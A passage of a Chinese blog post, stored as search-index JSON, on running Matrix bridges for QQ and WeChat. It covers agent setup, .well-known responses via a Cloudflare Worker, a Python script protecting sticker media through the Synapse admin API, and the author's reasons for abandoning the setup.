<p>\u8fd0\u884c\uff1a</p> <pre><code>matrix-wechat-agent.exe -h wss://matrix.example.com/_wechat -s %LISTEN_SECRET%\n</code></pre> <p>\u5373\u53ef\u5728 <code>matrix-wechat-agent</code> \u4e0e <code>matrix-wechat-bridge</code> \u4e4b\u95f4\u5efa\u7acb WebSocket \u8fde\u63a5\u3002</p> <p>\u6700\u540e\u5728 Bot \u5185\u6267\u884c <code>login</code>\uff0c\u5e76\u626b\u7801\u767b\u9646\u5373\u53ef\u3002</p> <p>\u51fa\u73b0\u95ee\u9898\u6700\u591a\u7684\u5730\u65b9\u5728\u4e8e\u5fae\u4fe1\u7248\u672c\u95ee\u9898\uff0c\u4f60\u7684\u5fae\u4fe1\u7248\u672c\u53f7\u5fc5\u987b\u4e0e <code>ComWeChatRobot.dll</code> \u7684\u7248\u672c\u53f7\u4e00\u81f4\uff0c\u5426\u5219\u8981\u4e48\u52a0\u8f7d\u4e0d\u51fa\u767b\u5f55\u4e8c\u7ef4\u7801\uff0c\u8981\u4e48\u5e72\u8106\u8fde\u5fae\u4fe1\u90fd\u8c03\u7528\u4e0d\u8d77\u6765\u3002</p> <p>\u5f53\u65f6\u7684 <code>ComWeChatRobot.dll</code> \u7248\u672c\u53f7\u662f <code>3.7.0.30</code>\uff0c\u4f46\u5b98\u7f51\u5fae\u4fe1\u7248\u672c\u65e9\u5c31\u4e0d\u662f\u8fd9\u4e2a\u7248\u672c\u4e86\u3002</p> <p>\u5371\u9669</p> <p>\u6211\u662f\u4ece\u8fd9\u91cc\u627e\u5230\u8001\u7248\u672c\u5fae\u4fe1\u7684\uff0c\u4f46\u6211\u65e0\u6cd5\u4fdd\u8bc1\u94fe\u63a5\u5b89\u5168\u6027\uff0c\u8bf7\u81ea\u884c\u7504\u522b\uff0c\u51fa\u73b0\u95ee\u9898\u6982\u4e0d\u8d1f\u8d23\uff1a</p> <ul> <li>https://sszs.oss-cn-hangzhou.aliyuncs.com/WeChatSetup3.7.0.30.exe</li> </ul>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#nginx-homeserver","title":"\u4f7f\u7528 nginx \u65f6\u65e0\u6cd5\u52a0\u5165\u5176\u4ed6 homeserver \u4e0a\u7684\u623f\u95f4","text":"<p>\u5728\u4f7f\u7528 Caddy \u90e8\u7f72\u65f6\uff0c\u6709\u4e00\u4e2a\u6b65\u9aa4\u662f\u5411 <code>Caddyfile</code> \u4e2d\u52a0\u5165\uff1a</p> <pre><code>example.com {\n    header /.well-known/matrix/* Content-Type application/json\n    header /.well-known/matrix/* Access-Control-Allow-Origin *\n\n    respond /.well-known/matrix/server `{\"m.server\": \"matrix.example.com:443\"}`\n    respond /.well-known/matrix/client `{\"m.homeserver\":{\"base_url\":\"https://matrix.example.com\"}}`\n}\n</code></pre> <p>\u800c\u6211\u4eec\u5728 nginx \u90e8\u7f72\u65f6\u6ca1\u6709\u8fdb\u884c\u8fd9\u4e2a\u6b65\u9aa4\uff0c\u56e0\u6b64\u9700\u8981\u624b\u52a8\u6dfb\u52a0\u3002</p> <p>\u6ce8\u610f</p> <p>\u5f53\u521d\u6211\u81ea\u5df1\u5c1d\u8bd5\u7684\u662f\u4f7f\u7528 nginx \u8bed\u6cd5\u91cd\u73b0\u4e0a\u8ff0\u529f\u80fd\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u662f Cloudflare \u8fd8\u662f nginx \u81ea\u5df1\u7684\u95ee\u9898\uff0c\u8fd9\u4e24\u4e2a headers \u6dfb\u52a0\u4e4b\u540e\u4ecd\u7136\u4f1a\u53d7\u5230\u540c\u6e90\u7b56\u7565\u5f71\u54cd\u5bfc\u81f4\u8de8\u57df\u95ee\u9898\uff0c\u56e0\u6b64\u6211\u6700\u540e\u4f7f\u7528\u4e86 Cloudflare Workers \u6765\u5b9e\u73b0\u8fd9\u4e2a Respond\u3002</p> <p>\u4e0d\u5c31\u662f\u4e2a\u5e26 headers \u7684 Respond \u561b\uff0c\u76f4\u63a5 Workers \u5f00\u5199\uff1a</p> <pre><code>addEventListener('fetch', event =&gt; {\nconst respond = {\n\"m.server\": \"matrix.example.com:443\",\n\"m.homeserver\": {\n\"base_url\": \"https://matrix.example.com\"\n}\n};  // \u522b\u5fd8\u4e86\u66ff\u6362 example.com\n\nconst json = JSON.stringify(respond, null, 2);\n\nreturn event.respondWith(\nnew Response(json, {\nheaders: { \"Content-Type\": \"application/json\",\n\"Access-Control-Allow-Origin\": \"*\"\n},\n})\n);\n});\n</code></pre> <p>\u5c06\u5176\u8def\u7531\u5230 <code>example.com/.well-known/matrix/*</code> \u5373\u53ef\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#22","title":"2.2 \u5ba2\u6237\u7aef\u4e0e\u5ba2\u6237\u7aef\u7684\u5751","text":"<p>\u63a8\u8350\u4f7f\u7528 Element \u4f5c\u4e3a Matrix \u534f\u8bae\u7684\u5ba2\u6237\u7aef\uff0cElement \u7684\u524d\u8eab\u662f Riot.im\uff0c\u4f46\u662f\u5f88\u663e\u7136\u5b83\u73b0\u5728\u5df2\u7ecf\u88ab Element \u4ee3\u66ff\u3002</p> <p>Element \u5ba2\u6237\u7aef\u7684\u4f7f\u7528\u57fa\u672c\u5904\u4e8e\u4e0a\u624b\u5373\u7528\u7684\u7ea7\u522b\uff0c\u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cMatrix \u534f\u8bae\u91c7\u7528 \u201c\u623f\u95f4\u201d \u7684\u5f62\u5f0f\u8fdb\u884c\u7ba1\u7406\uff0c\u5373\u591a\u4eba\u623f\u95f4\u5219\u4e3a\u7fa4\u804a\uff0c\u4e24\u4eba\u623f\u95f4\u5373\u4e3a\u79c1\u804a\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_4","title":"\u8d34\u7eb8","text":"<p>\u4e60\u60ef Telegram \u7684\u670b\u53cb\u548c\u7528\u591a\u4e86 QQ \u7684\u670b\u53cb\u770b\u5230\u8fd9\u91cc\u90fd\u6c89\u9ed8\u4e86\uff0c\u6ca1\u6709\u8d34\u7eb8 / \u8868\u60c5\u5305\u8fd9\u600e\u4e48\u6d3b\uff1f</p> <p>\u4e8b\u5b9e\u4e0a\uff0cElement\uff08\u6216\u8005\u5176\u4ed6 Matrix \u5ba2\u6237\u7aef\uff09\u5bf9\u8d34\u7eb8\uff08\u8fd8\u5305\u62ec\u6302\u4ef6\u3001Bot \u7b49\uff09\u7684\u652f\u6301\u5341\u5206\u9e21\u808b\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u4e1c\u897f\u9700\u8981\u7531\u7ba1\u7406\u96c6\u6210\u670d\u52a1\u5668\uff08\u4f8b\u5982 scalar.vector.im\uff09\u7edf\u4e00\u7ba1\u7406\u3002\u5355\u5c31\u8d34\u7eb8\u800c\u8a00\uff0c\u6240\u6709\u7684\u8d34\u7eb8\u5747\u6765\u81ea\u72ec\u7acb\u7684\u7ba1\u7406\u96c6\u6210\u670d\u52a1\u5668\uff08\u670d\u52a1\u5668\u751a\u81f3\u53ef\u4ee5\u4e0e\u4f60\u7684 homeserver \u4e0d\u540c\uff09\uff0c\u53d1\u9001\u8d34\u7eb8\u7684\u6d41\u7a0b\u6781\u5176\u8be1\u5f02\uff0c\u4ee5\u81f3\u4e8e\u6211\u5bf9\u8fd9\u73a9\u610f\u90fd\u8bf4\u4e0d\u6e05\u695a\u3002\u4f46\u76ee\u524d\u53ef\u4ee5\u786e\u5b9a\u7684\u662f\uff0c\u6240\u6709\u8d34\u7eb8\u5747\u4e0d\u5c5e\u4e8e\u7528\u6237\u4e2a\u4eba\uff0c\u7528\u6237\u53ea\u80fd\u5728\u5df2\u7ecf\u90e8\u7f72\u597d\u7684\u7ba1\u7406\u96c6\u6210\u670d\u52a1\u5668\u4e2d\u9009\u62e9\u5176\u4e2d\u63d0\u4f9b\u7684\u8d34\u7eb8\uff0c\u800c\u4e0d\u80fd\u81ea\u5df1\u4e0a\u4f20\uff0c\u8fd9\u5c31\u597d\u50cf\u4e00\u4e2a\u4e0d\u80fd\u4e0a\u4f20\u7684\u56fe\u5e8a\u3002</p> <p>\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u66f2\u7ebf\u6551\u56fd\uff0c\u901a\u8fc7\u6dfb\u52a0\u6302\u4ef6\u7684\u65b9\u5f0f\u53d8\u76f8\u5b9e\u73b0\u7ba1\u7406\u96c6\u6210\u670d\u52a1\u5668\u7684\u529f\u80fd\uff0c\u5177\u4f53\u64cd\u4f5c\u53ef\u89c1\u7af9\u6797\u91cc\u6709\u51b0\u7684\u535a\u5ba2\uff1a\u4e3aElement \u6dfb\u52a0\u81ea\u5df1\u559c\u6b22\u7684\u8d34\u7eb8\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_5","title":"\u8d34\u7eb8\u7684\u5751","text":"<p>\u6ca1\u9519\u8fd9\u91cc\u53c8\u6709\u5751\u3002</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u521b\u5efa\u4e00\u4e2a\u8d34\u7eb8\u6302\u4ef6\u9700\u8981\u5c06\u8d34\u7eb8\u4e0a\u4f20\u5230\u4efb\u610f\u4e00\u4e2a homeserver\uff08\u90a3\u5f53\u7136\u5c31\u662f\u6211\u4eec\u7684\u8fd9\u4e2a homeserver\uff09\uff0c\u4f46\u662f Synapse \u5bf9\u670d\u52a1\u7aef\u4e0a\u4fdd\u7559\u7684\u6240\u6709\u5a92\u4f53\u6587\u4ef6\u6709\u65f6\u95f4\u9650\u5236\uff0c\u4f8b\u5982\u6211\u4eec\u4e4b\u524d\u5c31\u5c06 <code>local_XXXX</code> \u7684\u4fdd\u7559\u65f6\u95f4\u9650\u5236\u4e3a 3 \u5929\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u6211\u4eec\u4e0a\u4f20\u7684\u8d34\u7eb8\u5c06\u5728 3 \u5929\u540e\u8fc7\u671f\uff0c\u540e\u7eed\u518d\u53d1\u9001\u5305\u542b\u8d34\u7eb8\u7684\u6d88\u606f homeserver \u53ea\u80fd\u54cd\u5e94\u7ed9\u4f60 404\u3002\u6b64\u65f6\u6211\u4eec\u53ea\u80fd\u901a\u8fc7 Protect API \u6765\u907f\u514d\u88ab\u5220\u9664\u3002\u4e3a\u6b64\uff0c\u6211\u5199\u4e86\u4e00\u4e2a Python \u811a\u672c\u6765\u8fdb\u884c\u6279\u91cf Protect\uff1a</p> <p>\uff08\u8bf7\u5148\u5411 homeserver \u4e0a\u4f20\u5b8c\u6240\u6709\u8d34\u7eb8\u540e\u518d\u8fdb\u884c\u8be5 Protect \u64cd\u4f5c\uff09</p> protect.py<pre><code>import os\nimport json\n\nfrom aiohttp import ClientSession\n\n\ndef get_media_id_list() -&gt; list:\n    result = []\n    for root, dirs, files in os.walk(r'D:\\path\\to\\web\\packs'):\n        for file in files:\n            if file == 'index.json':\n                continue\n            if file.endswith('.json'):\n                # load the json\n                with open(os.path.join(root, file), 'r') as f:\n                    j = json.load(f)\n                for sticker in j['stickers']:\n                    media_id = sticker['url'].split('/')[-1]\n                    result.append(media_id)\n\n    return result\n\n\nasync def protect():\n    headers = {\"Authorization\": \"Bearer 111111111111111111111111111111111111111\"}\n    # async with ClientSession() as sess, sess.post(url, data=data, headers=headers) as resp:\n    #     return (await resp.json())[\"content_uri\"]\n    async with ClientSession() as session:\n        for media_id in get_media_id_list():\n            url = f'https://matrix.example.com/_synapse/admin/v1/media/protect/{media_id}'\n            async with session.post(url, headers=headers) as resp:\n                print(url)\n                print(await resp.json())\n\n\nif __name__ == '__main__':\n    import asyncio\n    asyncio.run(protect())\n</code></pre> <p>\u8bf7\u6ce8\u610f\u4fee\u6539\u5176\u4e2d\u7684 <code>Bearer token</code> \u548c <code>example.com</code> \u4ee5\u53ca <code>os.walk()</code> \u7684\u8def\u5f84\u3002</p> <p>\u8fd9\u6837\u7684\u8bdd\uff0c\u6240\u6709\u6211\u4eec\u4e0a\u4f20\u5230 homeserver \u7684\u8d34\u7eb8\u90fd\u5c06\u6c38\u4e45\u4fdd\u5b58\u800c\u4e0d\u88ab\u5220\u9664\uff0c\u4ece\u800c\u5b9e\u73b0\u8d34\u7eb8\u7684\u6301\u4e45\u5316\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_6","title":"\u4e09\u3001\u5165\u571f","text":"<p>\u867d\u7136\u6211\u6307\u671b bridge \u8f6c\u53d1\u65b9\u6848\u80fd\u591f\u53d6\u4ee3\u81c3\u80bf\u7684 QQ \u548c\u5fae\u4fe1\u5ba2\u6237\u7aef\uff0c\u5e76\u4ee5\u6b64\u6c38\u4e45\u5220\u9664\u7535\u8111\u3001\u624b\u673a\u548c iPad \u4e0a\u7684\u5ba2\u6237\u7aef\uff0c\u4f46\u73b0\u5b9e\u662f\u6b8b\u9177\u7684\uff0c\u5b83\u5e76\u4e0d\u80fd\u6c38\u4e45\u53d6\u4ee3\u3002</p> <p>\u5e76\u4e14\u7531\u4e8e\u670d\u52a1\u5668\u7684\u8d1f\u62c5\u4e0d\u65ad\u52a0\u5267\uff0c\u4f7f\u5f97\u6211\u4e0d\u5f97\u4e0d\u6700\u7ec8\u653e\u5f03\u4e86 bridge \u8f6c\u53d1\u65b9\u6848\u5e76\u51b3\u5b9a\u5c06 homeserver \u4ece\u670d\u52a1\u5668\u4e0a\u5220\u9664\u3002</p> <p>\u6211\u6700\u7ec8\u653e\u5f03\u8fd9\u4e2a\u65b9\u6848\u7684\u539f\u56e0\u662f\u591a\u6837\u7684\uff0c\u4e3b\u8981\u662f\u7ec4\u6210 bridge \u8f6c\u53d1\u65b9\u6848\u7684\u5404\u4e2a\u65b9\u9762\u90fd\u6709\u7740\u81ea\u5df1\u7684\u5c40\u9650\u6027\u6216\u8005\u7f3a\u9677\uff1a</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#31","title":"3.1 \u670d\u52a1\u5668","text":"","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_7","title":"\u5185\u5b58","text":"<p>\u8fd0\u884c\u4e00\u4e2a\u5b9e\u65f6\u804a\u5929\u670d\u52a1\u7aef\u5e76\u4e0d\u662f\u4e00\u4ef6\u5f88 \u201c\u8f7b\u91cf\u201d \u7684\u4e8b\u60c5\uff0c\u4e8e\u662f\u9996\u5f53\u5176\u51b2\u7684\u5c31\u662f\u5185\u5b58\u7684\u4f7f\u7528\u3002</p> <p> </p> 12% \u7684\u6570\u636e\u5e93\u5360\u7528\u4e0e 10% \u7684 homeserver \u5360\u7528 <p>\u6211\u8fd0\u884c\u4e86\u4e24\u4e2a bridge\uff0c\u5e76\u52a0\u5165\u4e86\u82e5\u5e72\u4e2a\u516c\u5171\u623f\u95f4\u3002\u8fd9\u8fd8\u4ec5\u4ec5\u662f\u5728\u804a\u5929\u6d88\u606f\u4f4e\u5cf0\u671f\u7684\u5185\u5b58\u5360\u7528\u91cf\uff0c\u5728\u9ad8\u5cf0\u671f\u65f6\u4f1a\u66f4\u591a\u3002</p> <p>\u7531\u6b64\u5e26\u6765\u7684\u95ee\u9898\u662f\uff0c\u6bcf\u5f53\u804a\u5929\u9ad8\u5cf0\u671f\u6765\u4e34\u65f6\uff08\u665a\u4e0a 20 ~ 25 \u70b9\uff09\uff0c\u670d\u52a1\u5668\u4e0a\u7684\u5176\u4ed6\u8fdb\u7a0b\u4fbf\u9762\u4e34\u7740 Killed \u7684\u98ce\u9669\u3002</p> <p>\u5176\u6b21\uff0c\u5728\u516c\u5171\u623f\u95f4\u5185\u89e3\u5bc6\u5386\u53f2\u6d88\u606f\u65f6\uff08\u5c24\u5176\u662f\u56fe\u7247\u7b49\u5a92\u4f53\uff09\uff0cCPU \u5360\u7528\u7387\u4e5f\u4f1a\u7acb\u5373\u8fbe\u5230 100%\uff0c\u751a\u81f3\u66fe\u51fa\u73b0\u8fc7 <code>50, 45, 40</code> \u8fd9\u6837\u51e0\u5341\u7684\u8d1f\u8f7d\uff0c\u8fd9\u4e0d\u662f\u4e00\u4e2a\u5355\u6838 CPU \u7684\u670d\u52a1\u5668\u80fd\u627f\u53d7\u7684\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_8","title":"\u5b58\u50a8\u7a7a\u95f4","text":"<p>\u4f17\u6240\u5468\u77e5\uff0c\u6211\u4eec\u4f5c\u4e3a\u4e00\u4e2a\u5b9e\u65f6\u804a\u5929\u670d\u52a1\u7aef\uff0c\u9700\u8981\u5b58\u50a8\u5927\u91cf\u804a\u5929\u7684\u6570\u636e\u548c\u5a92\u4f53\uff0c\u957f\u671f\u79ef\u7d2f\u4e0b\u6765\uff0c\u8fd9\u4e9b\u6570\u636e\u548c\u5a92\u4f53\u4f1a\u5360\u7528\u5927\u91cf\u7684\u5b58\u50a8\u7a7a\u95f4\u3002</p> <p> </p> \u6570\u636e\u5e93\u5360\u7528\u548c\u5a92\u4f53\u5360\u7528 <p>\u4ec5\u4ec5\u662f\u4e24\u4e2a bridge \u548c\u82e5\u5e72\u4e2a\u516c\u5171\u623f\u95f4\uff0c\u5e76\u4e14\u6211\u7684\u8bbe\u7f6e\u662f\uff1a</p> <pre><code>media_retention:\nlocal_media_lifetime: 3d\nremote_media_lifetime: 7d\n</code></pre> <p>\u8fd9\u540c\u6837\u4e5f\u662f\u53ea\u6709 25G \u786c\u76d8\u7684 VPS \u627f\u53d7\u4e0d\u4e86\u7684\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#32-homeserver","title":"3.2 homeserver","text":"","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_9","title":"\u8d34\u7eb8","text":"<p>\u5148\u524d\u5df2\u7ecf\u8bf4\u8fc7\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u5728 Element \u5ba2\u6237\u7aef\u91cc\u53d1\u9001\u8d34\u7eb8\uff0c\u5fc5\u987b\u501f\u52a9\u5176\u4ed6\u7684\u5c0f\u6302\u4ef6\uff0c\u800c\u8fd9\u4e9b\u5c0f\u6302\u4ef6\u5fc5\u987b\u7531\u6211\u4eec\u4eb2\u81ea\u6784\u5efa\u3002\u8fd9\u4e2a\u6784\u5efa\u8fc7\u7a0b\u662f\u76f8\u5f53\u9ebb\u70e6\u7684\uff0c\u867d\u7136\u6709\u811a\u672c\u652f\u6301\uff0c\u4f46\u5e76\u4e0d\u662f\u5168\u81ea\u52a8\u7684\uff0c\u6211\u4eec\u4ecd\u7136\u9700\u8981\u5c06\u751f\u6210\u7684 <code>web</code> \u6587\u4ef6\u5939\u624b\u5de5\u4e0a\u4f20\u5230\u9759\u6001\u6258\u7ba1\u9875\u9762\u4e0a\u3002</p> <p>\u800c\u5728\u5df2\u7ecf\u6709\u73b0\u6210\u5c0f\u6302\u4ef6\u7684\u57fa\u7840\u4e0a\u6dfb\u52a0\u65b0\u7684\u8d34\u7eb8\uff0c\u5219\u9700\u8981\u5148\u4e0a\u4f20\u8d34\u7eb8\u540e\u5c06\u4e24\u4e2a <code>web</code> \u6587\u4ef6\u5939\u53ca\u5176 json \u6587\u4ef6\u8fdb\u884c\u5408\u5e76\uff0chtml \u6587\u4ef6\u7684\u5408\u5e76\u96be\u5ea6\u4e0d\u591a\u505a\u8bf4\u660e\uff0c\u800c\u5b83\u751f\u6210\u7684 json \u6587\u4ef6\u662f\u6781\u5176\u590d\u6742\u7684\uff0c\u53ea\u80fd\u518d\u5199\u4e00\u4e2a\u811a\u672c\u6765\u8fdb\u884c\u5408\u5e76\u64cd\u4f5c\u3002</p> <p>\u76f8\u6bd4\u4e4b\u4e0b\uff0cQQ \u65e0\u8bba\u662f\u6dfb\u52a0\u65b0\u7684\u8868\u60c5\u8fd8\u662f\u6536\u85cf\u5176\u4ed6\u4eba\u7684\u8868\u60c5\u90fd\u6bd4\u5b83\u65b9\u4fbf\u66f4\u591a\uff0c\u5373\u4f7f\u662f\u7a0d\u5fae\u590d\u6742\u4e00\u70b9\u7684 Telegram \u4e5f\u6bd4\u5b83\u65b9\u4fbf\u3002\u6211\u4eec\u539f\u672c\u5c31\u662f\u4e3a\u4e86\u53d6\u4ee3 QQ \u5ba2\u6237\u7aef\uff0c\u4f46\u5728\u8fd9\u4e00\u70b9\u4e0a bridge \u8f6c\u53d1\u65b9\u6848\u663e\u7136\u4e0d\u5982\u4ed6\uff0c\u4ecd\u7136\u575a\u6301\u8fd9\u79cd\u820d\u672c\u9010\u672b\u7684\u884c\u4e3a\u662f\u5f88\u611a\u8822\u7684\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_10","title":"\u67e5\u770b\u56fe\u7247","text":"<p>\u53e6\u4e00\u4e2a\u5341\u5206\u81f4\u547d\u7684\u5c40\u9650\u6027\u662f\uff0cSynapse \u5e76\u4e0d\u539f\u751f\u652f\u6301\u5c06\u591a\u5f20\u56fe\u7247\u53d1\u9001\u5728\u540c\u4e00\u4e2a\u6d88\u606f\u5185\uff0c\u4e5f\u4e0d\u652f\u6301\u6587\u5b57\u548c\u56fe\u7247\u53d1\u9001\u5728\u540c\u4e00\u4e2a\u6d88\u606f\u5185\uff0c\u800c\u8fd9\u5728 QQ \u91cc\u663e\u7136\u662f\u652f\u6301\u7684\u3002</p> <p>\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u7279\u6027\uff0c<code>matrix-qq-bridge</code> \u53ea\u80fd\u901a\u8fc7 markdown \u7684\u5f62\u5f0f\u5c06\u591a\u5f20\u56fe\u7247\u4ee5\u53ca\u6587\u5b57\u53d1\u9001\u5728\u540c\u4e00\u4e2a\u6d88\u606f\u5185\uff0c\u8fd9\u5bfc\u81f4\u4e86\u4e00\u4e2a\u76f8\u5f53\u5f71\u54cd\u4f53\u9a8c\u7684\u95ee\u9898\uff1a\u65e0\u6cd5\u70b9\u5f00\u8fd9\u4e9b\u56fe\u7247\u4ece\u800c\u67e5\u770b\u5927\u56fe\uff0c\u8fd9\u5bfc\u81f4\u6709\u4e2a\u65f6\u5019\u6211\u5fc5\u987b\u6253\u5f00 QQ \u5ba2\u6237\u7aef\u624d\u80fd\u770b\u5176\u4e2d\u611f\u5174\u8da3\u7684\u56fe\u7247\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#33","title":"3.3 \u5ba2\u6237\u7aef","text":"<p>Element \u672c\u8eab\u662f\u4e00\u4e2a\u597d\u7684\u5ba2\u6237\u7aef\uff0c\u4f46\u662f\u5bf9\u6211\u4eec\uff08\u53ea\u7528\u5230\u4e86 bridge \u8f6c\u53d1\u65b9\u6848\uff09\u6765\u8bf4\uff0c\u5b83\u7684\u529f\u80fd\u5b9e\u5728\u662f\u592a\u591a\u4e86\uff0c\u751a\u81f3\u6709\u70b9\u6d6a\u8d39\uff0c\u4f8b\u5982\u6295\u7968\u3001\u53d1\u9001\u4f4d\u7f6e\u7b49\u3002</p> <p></p> <p>\u53e6\u4e00\u65b9\u9762\uff0cElement \u7684 iOS\u3001Android \u548c Web \u5ba2\u6237\u7aef\u5bf9\u56fe\u7247\u7f29\u7565\u56fe\u7684\u5c3a\u5bf8\u5904\u7406\u4e0d\u662f\u5f88\u597d\uff0c\u65e0\u8bba\u591a\u5927\u8fd8\u662f\u591a\u5c0f\u7684\u56fe\u7247\uff0c\u5f53\u4ed6\u4eec\u5728 Element \u5ba2\u6237\u7aef\u4e0a\u663e\u793a\u65f6\uff0c\u90fd\u5c06\u88ab\u7b49\u6bd4\u7f29\u653e\u76f4\u5230\u67d0\u4e00\u6700\u5927\u5bbd\u5ea6\u6216\u662f\u6700\u5927\u9ad8\u5ea6\uff08\u7591\u4f3c\uff09\u3002\u5bf9\u4e8e\u5927\u5c3a\u5bf8\u56fe\u7247\u6765\u8bf4\u8fd9\u65e0\u53ef\u539a\u975e\uff0c\u4f46\u662f\u5bf9\u4e8e\u5c0f\u5c3a\u5bf8\u56fe\u7247\uff08\u5c24\u5176\u662f\u8868\u60c5\u5305\uff09\u6765\u8bf4\uff0c\u8fd9\u6837\u7684\u5904\u7406\u65b9\u5f0f\u770b\u8d77\u6765\u8ba9\u4eba\u5341\u5206\u4e0d\u723d\u3002</p> <p>\u6bd4\u5982\u50cf\u8fd9\u6837\uff0c\u5c06\u4e00\u4e2a\u5c0f\u5c0f\u7684\u8868\u60c5\u653e\u5927\u81f3\u9875\u9762\u63a5\u8fd1\u4e09\u5206\u4e4b\u4e00\u7684\u9762\u79ef\uff0c\u5bf9\u4e8e\u5e38\u5e38\u4f7f\u7528\u6216\u63a5\u6536\u8868\u60c5\u7684\u7528\u6237\u6765\u8bf4\u662f\u76f8\u5f53\u75db\u82e6\u7684\u3002</p> <p>\u6b64\u5916\uff0cElement \u5ba2\u6237\u7aef\u4e2d\u8fd8\u6709\u4e00\u4e9b\u7ec6\u8282\u4ee4\u6211\u5341\u5206\u4e0d\u723d\uff1a</p> <ul> <li>@ \u4eba\u65f6\u4f1a\u81ea\u52a8\u6dfb\u52a0\u4e00\u4e2a\u5192\u53f7\u5728\u540e\u9762</li> <li>\u70b9\u51fb\u804a\u5929\u56fe\u7247\u67e5\u770b\u5927\u56fe\uff0c\u8fd4\u56de\u65f6\u5c06\u76f4\u63a5\u8fd4\u56de\u5230\u804a\u5929\u8bb0\u5f55\u6700\u5e95\u90e8\u800c\u4e0d\u662f\u539f\u6765\u56fe\u7247\u7684\u4f4d\u7f6e\uff08\u65b0\u7248\u672c Bug\uff09</li> </ul>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#34-bridge","title":"3.4 bridge","text":"","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_11","title":"\u5934\u50cf\u6635\u79f0\u540c\u6b65","text":"<p>\u6211\u4eec\u80fd\u5728 Element \u4e2d\u770b\u5230\u6765\u81ea QQ \u548c\u5fae\u4fe1\u7684\u5934\u50cf\uff0c\u8fd9\u662f\u56e0\u4e3a bridge \u4f1a\u5c06\u8fd9\u4e9b\u5934\u50cf\u4e0b\u8f7d\u4e0b\u6765\u3002\u4f46\u662f\u5f53\u7528\u6237\u66f4\u6362\u5934\u50cf\uff08\u8fd8\u5305\u62ec\u6635\u79f0\u3001\u7fa4\u6635\u79f0\uff09\u65f6\uff0cbridge \u5e76\u4e0d\u80fd\u53ca\u65f6\u66f4\u65b0\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4ece\u800c\u5728\u663e\u793a\u4e0a\u51fa\u73b0\u5ef6\u8fdf\u3002\u4f5c\u4e3a Bot \u5f00\u53d1\u8005\uff0c\u6211\u5f88\u6e05\u695a\u8fd9\u662f\u4e00\u4e2a\u6280\u672f\u5c40\u9650\u95ee\u9898\uff0c\u53ea\u80fd\u901a\u8fc7\u5b9a\u671f\u6216\u624b\u52a8\u540c\u6b65\u624d\u80fd\u89e3\u51b3\u3002</p> <p>bridge \u672c\u8eab\u662f\u5b9a\u671f\u540c\u6b65\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u624b\u52a8\u540c\u6b65\uff0c\u5411 Bot \u53d1\u9001\u4ee5\u4e0b\u6d88\u606f\u5373\u53ef\uff08QQ \u548c\u5fae\u4fe1\u7684 bridge \u90fd\u9002\u7528\uff09\uff1a</p> <pre><code>sync contacts --contact-avatars\nsync groups\n</code></pre>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_12","title":"\u5fae\u4fe1","text":"<p>\u5fae\u4fe1\u7684 bridge \u548c agent \u90fd\u662f\u5f88\u4f18\u79c0\u7684\u8bbe\u8ba1\uff0c\u4f46\u662f\u4ecd\u7136\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\u3002</p> <p>\u957f\u65f6\u95f4\u6ca1\u6709\u6536\u5230\u5fae\u4fe1\u6d88\u606f\u540e\uff0c\u6211\u731c\u60f3\u53ef\u80fd\u662f agent \u548c bridge \u4e4b\u95f4\u5b58\u5728\u8fde\u63a5\u95ee\u9898\u6216\u662f\u767b\u5f55\u5931\u6548\uff0c\u4e8e\u662f\u5c1d\u8bd5 <code>ping</code> \u6307\u4ee4\uff0c\u53d1\u73b0\u63d0\u793a <code>You're not logged into Wechat.</code>\uff0c\u5c1d\u8bd5 <code>login</code> \u767b\u5f55\uff0c\u63d0\u793a <code>Get QR code timed out. Please restart the login.</code>\u3002</p> <p>\u4e8b\u5b9e\u4e0a\u8fd9\u4e2a\u65f6\u5019\u5df2\u7ecf\u91cd\u8fde\u6210\u529f\u4e86\uff0c\u518d\u6b21\u8f93\u5165 <code>login</code> \u53ef\u80fd\u4f1a\u63d0\u793a <code>You're already logged in</code>\uff0c\u6216\u8005\u8f93\u5165 <code>ping</code> \u4f1a\u63d0\u793a <code>Logged in as 